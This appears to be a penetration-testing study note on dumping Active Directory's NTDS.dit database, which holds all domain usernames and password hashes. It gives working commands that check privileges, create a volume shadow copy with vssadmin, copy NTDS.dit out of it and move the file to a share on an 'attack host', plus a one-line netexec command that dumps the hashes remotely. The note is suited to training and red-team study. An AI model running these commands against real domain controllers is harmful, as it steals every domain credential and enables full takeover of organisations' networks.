#NTDS 
_NT Directory Services_ (_NTDS_) is the directory service used with AD to find & organize network resources.

The file are stored at -> _%systemroot%/ntds_ on DC
In the folder we can find _.dit_ file stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).
This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

**DUMP NTDS.dit**
To make a copy of the NTDS.dit file, we need local admin (_Administrators group_) or Domain Admin (_Domain Admins group_) (or equivalent) rights. We also will want to check what domain privileges we have.
```cmd
net localgroup
net user <USERS>
```

_Creating Shadow Copy of C:_
We can use _vssadmin_ to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (_VSS_) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.
```cmd
vssadmin CREATE SHADOW /For=C:
```

_Copying NTDS.dit from the VSS_
We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

_Transferring NTDS.dit to Attack Host_
```cmd
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP>\<YOUR SHARE> 
```

## Faster way using NXC
This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
```bash
nxc smb <IP> -u <USER> -p <PASS> --ntds
```